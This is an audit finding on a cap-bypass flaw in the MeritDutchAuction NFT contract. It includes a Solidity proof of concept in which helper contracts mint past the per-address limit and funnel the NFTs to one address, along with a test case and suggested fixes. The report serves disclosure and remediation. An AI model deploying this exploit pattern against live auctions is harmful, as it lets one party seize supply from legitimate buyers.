# [H] `MeritDutchAuction.CAP_PER_ADDRESS` can be bypassed easily

## Summary
Severity: High
Reporter: AkshaySrivastav
Source: https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L141
Type: audit-issue

## Details
# `MeritDutchAuction.CAP_PER_ADDRESS` can be bypassed easily

## Summary
The `MeritDutchAuction` contract has a `CAP_PER_ADDRESS` for an account but this limit can be bypassed easily resulting in an account holding all possible NFTs.

## Vulnerability Detail
The `MeritDutchAuction` contract intends to limit an account from minting more than `CAP_PER_ADDRESS` NFTs. But an attacker can use smart contracts to mint all possible NFTs to himself in a single transaction.

The attacker can dynamically deploy different smart contracts that each mint `CAP_PER_ADDRESS` to itself. Then each contract can transfer all the minted NFTs to a single attacker controlled address. Using this method the attacker can capture `MINT_CAP` (currently 10,000) NFTs. All of this happens in a single transaction.

POC:
These new contracts and test case were added to `MeritDutchAuction.t.sol`.
```solidity

contract Buyer1 {
    MeritDutchAuction public immutable auction;
    Buyer2 public buyer2;

    constructor(address _auction) {
        auction = MeritDutchAuction(_auction);
        buyer2 = new Buyer2(_auction);
    }

    function mintNFT() public payable {
        auction.mint{value: msg.value}(4);
    }
    fallback() external payable {
        buyer2.mintMoreNFT{value: msg.value}();
    }
}

contract Buyer2 {
    MeritDutchAuction public immutable auction;

    constructor(address _auction) {
        auction = MeritDutchAuction(_auction);
    }
    function mintMoreNFT() external payable {
        auction.mint{value: msg.value}(4);

        uint numTokens = auction.nft().balanceOf(address(this));
        uint[] memory tokenIds = new uint[](numTokens);
        for (uint i; i < numTokens; i++) {
            tokenIds[i] = auction.nft().tokenOfOwnerByIndex(address(this), i);
        }

        for (uint i; i < numTokens; i++) {
            auction.nft().transferFrom(address(this), msg.sender, tokenIds[i]);
        }
    }
}
```
```solidity
    function test_audit_bypassCap() public {
        Buyer1 buyer1 = new Buyer1(address(auction));

        vm.startPrank(wallet1);
        assertEq(auction.nft().balanceOf(address(buyer1)), 0);

        vm.warp(startTime);
        buyer1.mintNFT{value: START_PRICE * 8}();

        assertEq(auction.nft().balanceOf(address(buyer1)), 8);
    }
```

In this test case, a single account was able to capture 8 NFTs in a single transaction. By performing this attack repeatedly the attacker can mint 10,000 NFTs to himself in a single txn as soon as the auction starts. The legitimate users won't even get a chance to mint any NFT for themselves.

## Impact
A single user can mint all NFTs (upto `MINT_CAP`) to himself in a single txn bypassing the `CAP_PER_ADDRESS` limit. 

This attack breaks the assumption of protocol that no account can mint more than `CAP_PER_ADDRESS` NFTs. Hence results in the attacker holding all NFTs which the protocol always wanted to protect against.

## Code Snippet
https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L141

## Tool used

Manual Review

## Recommendation
Different mitigation strategies can be applied here to fix this issue like:
- Consider adding a `tx.origin == msg.sender` check but this will prevent all contracts from minting an NFT.
- Consider adding a per block mint limit so that only a small number of NFTs can be minted in a single block.
